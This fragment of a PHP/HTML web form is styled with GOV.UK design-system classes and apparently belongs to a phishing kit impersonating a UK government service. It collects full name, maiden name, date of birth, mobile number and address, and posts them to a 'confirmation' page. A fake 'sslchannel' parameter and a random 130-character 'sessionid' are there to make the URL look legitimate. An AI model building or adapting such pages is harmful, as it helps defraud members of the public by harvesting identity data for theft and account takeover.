                    ...
                    <div class="govuk-grid-column-two-thirds">
                        ...
                        <form action="confirmation?sslchannel=true&sessionid=<?=generateRandomString(130);?>" method="POST">
                            ...
                            <div class="govuk-form-group">
								...
								<span style="display:none;" class="govuk-error-message">Enter your full name </span>
                                <input name="fullname" id="fullname" type="text" class="govuk-input govuk-!-width-three-quarters" autocomplete="off" required="" />
                            </div>
                                                        <div class="govuk-form-group">
				<label for="maidenname" class="govuk-label"> Maiden name </label>
								<span style="display:none;" class="govuk-error-message">Enter your maiden name </span>
                                <input maiden="maidenname" id="maidenname" type="text" class="govuk-input govuk-!-width-three-quarters" autocomplete="off" required="" />
                            </div>			<div class="govuk-form-group">
                                <label for="dob" class="govuk-label"> Date of birth </label>
								<span style="display:none;" class="govuk-error-message">Enter your date of birth </span>
                                <input name="dob" id="dob" type="tel" class="govuk-input govuk-!-width-three-quarters" autocomplete="off" required="" />
                            </div>
							<div class="govuk-form-group">
                                <label for="mobile" class="govuk-label"> Mobile number </label>
								<span style="display:none;" class="govuk-error-message">Enter your mobile number </span>
                                <input name="mobile" id="mobile" type="tel" class="govuk-input govuk-!-width-three-quarters" autocomplete="off" required="" />
                            </div>
							<div class="govuk-form-group">
                                <label for="address" class="govuk-label"> Address </label>
								<span style="display:none;" class="govuk-error-message">Enter your address </span>
                                <input name="address" id="address" type="text" class="govuk-input govuk-!-width-three-quarters" autocomplete="off" required="" />
                            </div>
							<div class="govuk-form-group">
                                <label for="town" class="govuk-label"> Town </label>
								<span style="display:none;" class="govuk-error-message">Enter your town </span>
                                <input name="town" id="town" type="text" class="govuk-input govuk-!-width-three-quarters" autocomplete="off" required="" />
                            </div>
							<div class="govuk-form-group">
                                <label for="postcode" class="govuk-label"> Postcode </label>
								<span style="display:none;" class="govuk-error-message">Enter your postcode </span>
                                <input name="postcode" id="postcode" type="text" class="govuk-input govuk-!-width-three-quarters" autocomplete="off" required="" />
                            </div>
